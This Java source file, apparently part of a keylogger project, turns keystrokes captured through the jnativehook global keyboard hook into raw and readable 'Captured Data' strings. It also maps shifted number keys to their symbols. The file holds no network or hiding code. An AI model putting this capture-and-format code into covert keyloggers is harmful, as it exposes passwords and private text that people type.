/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Controllers;

import java.util.List;
import org.jnativehook.keyboard.NativeKeyEvent;

/**
 *
 * @author ahmed
 */
public class KeyCodes {

    private KeyCodes() {
    }

    public static String rawPrint(List<StoreKeyStrokes> storage) {
        if (storage.isEmpty()) {
            return "No keys have been pressed!";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("<br/> Raw Data: <br/>");
        for (StoreKeyStrokes keyStorage : storage) {
            sb.append(keyStorage.toString() + System.lineSeparator());

        }
        return sb.toString();
    }

    public static String prettyPrint(List<StoreKeyStrokes> storage) {
        if (storage.isEmpty()) {
            return "No keys have been pressed!";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("<br/> Captured Data: <br/>");

        boolean shifted = false;
        for (StoreKeyStrokes keyStorage : storage) {
            if (keyStorage.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
                shifted = keyStorage.isPressed();
            }

            String key = processKey(keyStorage.getKeyCode(), shifted);

            if (keyStorage.isPressed()) {
                if (shifted) {
                    sb.append(key.toUpperCase());
                } else {
                    sb.append(key.toLowerCase());
                }
            }
        }

        return sb.toString();
    }

    private static String processKey(int keycode, boolean shifted) {
        String key = NativeKeyEvent.getKeyText(keycode);

        if (key.length() != 1) {
            if (!key.contains("Unknown keycode")) {
                key = "{" + key + "}";
            }
        }
        if (keycode == NativeKeyEvent.VC_SHIFT) {
            key = "";
        } else if (keycode == NativeKeyEvent.VC_SPACE) {
            key = " ";
        } else if (keycode == NativeKeyEvent.VC_1 && shifted) {
            key = "!";
        } else if (keycode == NativeKeyEvent.VC_2 && shifted) {
            key = "@";
        } else if (keycode == NativeKeyEvent.VC_3 && shifted) {
            key = "#";
        } else if (keycode == NativeKeyEvent.VC_4 && shifted) {
            key = "$";
        } else if (keycode == NativeKeyEvent.VC_5 && shifted) {
            key = "%";
        } else if (keycode == NativeKeyEvent.VC_6 && shifted) {
            key = "^";
        } else if (keycode == NativeKeyEvent.VC_7 && shifted) {
            key = "&";
        } else if (keycode == NativeKeyEvent.VC_8 && shifted) {
            key = "*";
        } else if (keycode == NativeKeyEvent.VC_9 && shifted) {
            key = "(";
        } else if (keycode == NativeKeyEvent.VC_0 && shifted) {
            key = ")";
        }
        return key;
    }
}
